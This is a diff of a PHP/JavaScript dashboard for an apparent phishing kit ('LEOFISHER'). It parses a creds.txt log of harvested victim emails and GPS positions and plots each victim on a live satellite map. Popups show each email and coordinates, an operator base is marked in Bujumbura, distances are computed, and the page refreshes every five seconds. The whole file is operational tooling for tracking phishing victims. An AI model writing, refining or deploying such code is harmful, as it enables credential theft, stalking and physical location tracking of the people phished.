@@ -3,55 +3,32 @@ date_default_timezone_set('Africa/Bujumbura');
 $creds_file = 'creds.txt';
 $victims = [];
 
-// Parseur ROBUSTE - capture TOUS formats possibles
+// Parseur PRO - extrait TOUS GPS + infos depuis logs ASCII
 if (file_exists($creds_file)) {
     $logs = file_get_contents($creds_file);
-    
-    // Méthode 1: Ton format original avec separator
     $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);
+
     foreach ($entries as $entry) {
-        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.?\d*),?\s*([-+]?\d+\.?\d*)/i', $entry, $gps)) {
-            if (preg_match('/📧 .*?:?\s*([^\s\r\n]+@[^\s\r\n]+)/i', $entry, $email)) {
-                $lat = floatval($gps[1]);
-                $lng = floatval($gps[2]);
-                if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
+        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
+            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
+                $email = trim($email_match[1]);
+                $lat = floatval($gps_match[1]);
+                $lng = floatval($gps_match[2]);
+                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) { // Valid GPS
                     $victims[] = [
-                        'lat' => $lat, 'lng' => $lng,
-                        'email' => trim($email[1]),
-                        'ip' => 'N/A',
+                        'lat' => $lat,
+                        'lng' => $lng,
+                        'email' => $email,
+                        'ip' => 'N/A', // Extract if needed
                         'time' => date('H:i:s')
                     ];
                 }
             }
         }
     }
-    
-    // Méthode 2: Recherche globale (fallback tous formats)
-    if (empty($victims)) {
-        preg_match_all('/📍 GPS POSITION : ([-+]?\d+\.?\d*),?\s*([-+]?\d+\.?\d*)/i', $logs, $gps_all, PREG_SET_ORDER);
-        preg_match_all('/📧 .*?:?\s*([^\s\r\n]+@[^\s\r\n]+)/i', $logs, $email_all, PREG_SET_ORDER);
-        
-        $gps_count = count($gps_all);
-        $email_count = count($email_all);
-        for ($i = 0; $i < min($gps_count, $email_count); $i++) {
-            $lat = floatval($gps_all[$i][1]);
-            $lng = floatval($gps_all[$i][2]);
-            if ($lat != 0 && $lng != 0 && abs($lat) <= 90 && abs($lng) <= 180) {
-                $victims[] = [
-                    'lat' => $lat, 'lng' => $lng,
-                    'email' => trim($email_all[$i][1]),
-                    'ip' => 'N/A',
-                    'time' => date('H:i:s')
-                ];
-            }
-        }
-    }
-    
-    // Debug info (visible 10s puis cache)
-    $debug_info = "Victimes parsed: " . count($victims) . " | Fichier: " . strlen($logs) . " octets";
 }
 
-// Coordonnées OPÉRATEUR Bujumbura
+// Coordonnées OPÉRATEUR Bujumbura (toi)
 $op_lat = -3.361378;
 $op_lng = 29.359912;
 ?>
@@ -128,7 +105,7 @@ $op_lng = 29.359912;
         🟡 OP Command | 🔴 Pulsing Victims<br>
         📏 Routes OP→Victime | 🛰️ HD Satellite | 🔄 Live 5s
     </div>
-
+    <!-- Leaflet JS + Plugins -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
 
@@ -139,57 +116,76 @@ $op_lng = 29.359912;
         const opLng = <?php echo $op_lng; ?>;
         const victims = <?php echo json_encode($victims); ?>;
 
-        // Satellite HD + Roads
-        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { maxZoom: 22, minZoom: 1 });
-        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { opacity: 0.6, maxZoom: 22 });
+        // SATELLITE 2025 HD Esri WorldImagery (maxZoom 22, roads overlay)
+        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+            attribution: '© Esri WorldImagery 2025 HD',
+            maxZoom: 22,
+            minZoom: 1
+        });
 
-        map = L.map('map', { layers: [satellite, roads], zoomControl: false, minZoom: 1, maxZoom: 22 }).setView([opLat, opLng], 10);
+        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap',
+            opacity: 0.7,
+            maxZoom: 22
+        });
 
-        // OP MARKER (jaune militaire)
+        map = L.map('map', {
+            layers: [satellite, roads],
+            zoomControl: false,
+            minZoom: 1,
+            maxZoom: 22
+        }).setView([opLat, opLng], 10);
+
+        // OPÉRATEUR MARKER VISIBLE (jaune gros)
         const opMarker = L.marker([opLat, opLng], {
             icon: L.divIcon({
                 className: 'op-marker',
-                html: '<div style="background:#ffaa00;color:#000;font-weight:bold;border-radius:50%;width:35px;height:35px;line-height:35px;text-align:center;font-size:12px">OP</div>',
-                iconSize: [35, 35]
+                html: '🟡 <strong>OP</strong>',
+                iconSize: [30, 30]
             })
-        }).addTo(map).bindPopup('<b style="color:#ffaa00">🚨 COMMANDE OP Bujumbura</b>');
+        }).addTo(map).bindPopup('<b>🚨 OPÉRATEUR Bujumbura</b><br>Position fixe');
         bounds.extend([opLat, opLng]);
 
-        // VICTIMES + ROUTES (rouges pulsants)
+        // VICTIMES MARKERS VISIBLE (rouges clignotants PRO)
         victims.forEach((victim, index) => {
-            const vicIcon = L.divIcon({
-                className: 'victim-marker',
-                html: `<div style="background:#ff4444;color:#fff;border-radius:50%;width:32px;height:32px;line-height:32px;text-align:center;font-weight:bold;font-size:12px">#${index+1}</div>`,
-                iconSize: [32, 32]
-            });
-            
-            const victimMarker = L.marker([victim.lat, victim.lng], { icon: vicIcon })
-                .bindPopup(`
-                    <div style="font-family:monospace;color:#ff4444;width:250px">
-                        <h3 style="color:#ffaa00">🎯 VICTIME #${index+1}</h3>
-                        <strong>📧</strong> ${victim.email}<br>
-                        <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
-                        <strong>🕒</strong> ${victim.time}
-                    </div>
-                `);
-            
+            const victimMarker = L.marker([victim.lat, victim.lng], {
+                icon: L.divIcon({
+                    className: 'victim-marker',
+                    html: `🔴 #${index+1}`,
+                    iconSize: [25, 25],
+                    className: 'victim-marker'
+                })
+            }).addTo(map).bindPopup(`
+                <div style="font-family: monospace; color: #ff0000;">
+                    <h3>🎯 VICTIME #${index+1}</h3>
+                    <strong>📧 Email:</strong> ${victim.email}<br>
+                    <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
+                    <strong>🕒 Time:</strong> ${victim.time}
+                </div>
+            `);
+
             markers.addLayer(victimMarker);
             bounds.extend([victim.lat, victim.lng]);
-            
-            // Route OP→Victime
-            L.polyline([[opLat, opLng], [victim.lat, victim.lng]], {
-                color: '#ff4444', weight: 4, opacity: 0.8, dashArray: '15 10'
-            }).addTo(map);
         });
 
         map.addLayer(markers);
-        if (bounds.isValid() && victims.length > 0) map.fitBounds(bounds.pad(0.1));
+        if (bounds.isValid()) map.fitBounds(bounds);
 
+        // Distance Haversine PRO (km + walk/drive time)
+        function haversine(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        // Update stats
         document.getElementById('victimCount').textContent = victims.length;
-        document.getElementById('debugInfo').textContent = `Victimes: ${victims.length} | Parsing OK`;
 
-        // Auto-refresh 5s
-        setInterval(() => location.reload(), 5000);
+        // Auto-refresh PRO 5s
+        setInterval(() => { location.reload(); }, 5000);
     </script>
 </body>
 </html>
